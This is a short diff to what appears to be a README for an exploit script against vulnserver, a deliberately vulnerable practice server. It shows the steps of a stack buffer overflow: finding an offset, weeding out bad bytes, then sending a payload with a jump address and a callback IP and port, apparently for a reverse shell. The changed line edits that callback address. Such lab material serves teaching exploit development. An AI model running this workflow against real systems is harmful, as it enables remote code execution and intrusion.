@@ -24,7 +24,7 @@ The complete process for attacking vulnserver with this tool looked more like th
 # Now I know that the offset is 2006, because that's what mode 5 gives me as output, so now I sent a buffer with all byte values 0-255...
 ./exploitshadow.py 3 2006 10.0.0.13 9999
 # Keep doing that and using badbytecheck.py to eliminate bad bytes/chars. When you have them all eliminated, and you find a proper jump address, send payload...
-./exploitshadow.py 4 2006 0x11223344 10.0.10.10 443 10.0.0.13 9999
+./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.13 9999
 
 ----- BadByteCheck.py -----
 
